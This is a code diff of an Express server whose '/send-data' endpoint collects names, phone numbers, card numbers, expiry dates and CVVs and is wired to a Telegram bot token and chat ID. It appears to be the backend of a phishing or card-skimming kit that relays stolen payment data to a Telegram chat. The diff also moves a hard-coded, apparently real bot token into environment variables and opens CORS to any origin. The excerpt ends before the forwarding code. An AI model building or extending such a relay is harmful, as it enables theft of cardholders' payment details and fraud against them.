@@ -1,11 +1,18 @@
 const express = require('express');
 const axios = require('axios');
 const app = express();
+
 app.use(express.json());
 
-// Replace these with your actual bot token and chat ID
-const BOT_TOKEN = '8438654761:AAHMlWjDm6QsBMR0OerJQ8Ds6-lJR5jj0iw';
-const CHAT_ID = '1900857584';
+// CORS middleware to allow requests from any origin (adjust for production)
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*'); // You can replace '*' with your frontend URL for better security
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+  next();
+});
+
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
 
 app.post('/send-data', async (req, res) => {
   const { fullname, email, phone, operator, reason, cardNumber, expiryDate, cvv } = req.body;
